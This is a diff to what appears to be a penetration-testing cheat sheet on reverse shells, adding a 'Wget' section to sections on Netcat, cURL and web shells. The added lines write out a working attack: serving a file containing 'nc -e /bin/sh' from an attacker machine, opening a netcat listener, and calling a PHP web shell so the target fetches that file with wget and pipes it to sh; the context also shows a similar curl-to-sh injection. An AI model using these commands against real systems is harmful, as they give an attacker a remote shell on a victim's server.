@@ -8,6 +8,7 @@
   * [<kbd>Netcat URL Encoding</kbd>](#Netcat-URL-Encoding)
   * [<kbd>Netcat Base64 Encoding</kbd>](#Netcat-Base64-Encoding)
 - [<kbd>cURL</kbd>](#cURL)
+- [<kbd>Wget</kbd>](#Wget)
 - [<kbd>WebShell</kbd>](#WebShell)
   * [<kbd>Exif Data</kbd>](#Exif-Data)
   * [<kbd>ASP WebShell</kbd>](#ASP-WebShell)
@@ -146,6 +147,19 @@
  
   ```cmd
   http://192.168.1.3/cmd.php?cmd=curl 192.168.1.2/index.html|sh
+  ```
+  
+  ---
+   
+  # <kbd>Wget</kbd>
+ 
+  ```cmd
+  root@kali:~# echo "nc -e /bin/sh 192.168.1.2 443" > index.html; python3 -m http.server 80
+  root@kali:~# nc -lvnp 443
+  ```
+ 
+  ```cmd
+  http://192.168.1.3/cmd.php?cmd=wget -qO- 192.168.1.2:6666/index.html|sh
   ```
  
   ---
